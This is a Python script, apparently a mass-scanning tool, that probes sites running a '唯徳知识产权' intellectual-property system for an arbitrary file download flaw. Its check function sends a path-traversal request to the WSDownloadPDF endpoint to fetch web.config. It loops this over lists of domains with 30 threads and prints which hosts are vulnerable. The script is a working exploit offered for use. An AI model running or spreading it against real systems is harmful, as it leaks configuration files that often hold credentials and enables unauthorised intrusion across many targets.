import random
import textwrap
from multiprocessing.dummy import Pool
import requests, argparse, warnings
from requests.packages import urllib3

CHAR_ART = [
    "██╗    ██╗██████╗  █████╗  ██████╗",
    "██║    ██║██╔══██╗██╔══██╗██╔═══██╗",
    "██║ █╗ ██║██████╔╝███████║██║   ██║",
    "██║███╗██║██╔═══╝ ██╔══██║╚██╗ ██╔╝",
    "╚███╔███╔╝██║     ██║  ██║ ╚████╔╝ ",
    " ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝  ╚═══╝ "
]

def main():
    print("\n" + random.choice(CHAR_ART) + "\n")

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('使用说明: 唯徳知识产权-WSDownloadPDF任意文件下载检测工具'))
    parser.add_argument("-u", dest="url", type=str, help="URL")
    parser.add_argument("-f", dest="file", type=str, help="FILE")
    args = parser.parse_args()

    urls = []
    if args.url:
        if 'http://' in args.url:
            urls.append(args.url)
        else:
            urls.append(f"http://{args.url}")
    elif args.file:
        try:
            with open(args.file, 'r+') as f:
                for domain in f:
                    domain = domain.strip()
                    if 'http://' in domain:
                        urls.append(domain)
                    else:
                        urls.append(f"http://{domain}")
        except FileNotFoundError as e:
            print(e)

    pool = Pool(30)
    pool.map(check, urls)


def check(domain):
    url = f"{domain}/wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config"
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    }
    try:
        result = requests.get(url, headers=header, timeout=3)
        if 'xml version="1.0" encoding="utf-8"' in result.text and result.status_code == 200:
            print(f"[*]:存在漏洞地址:{domain}")
        else:
            print(f"[-]:不存在漏洞地址:{domain}")
    except Exception as e:
        print(f"错误地址{domain}")

if __name__ == '__main__':
    main()
